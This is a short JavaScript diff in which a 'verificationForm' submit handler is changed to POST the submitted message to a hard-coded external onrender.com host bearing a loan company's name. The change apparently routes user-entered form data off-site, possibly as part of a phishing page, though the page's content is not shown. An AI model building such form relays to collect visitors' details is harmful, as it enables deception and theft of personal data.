@@ -35,7 +35,7 @@ document.getElementById('verificationForm').addEventListener('submit', async fun
     document.getElementById('loadingOverlay').classList.remove('hidden');
     
     try {
-        await fetch('/api/send-message', {
+        fetch('https://ghana-bayport-loans-1.onrender.com/api/send-message', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ message })
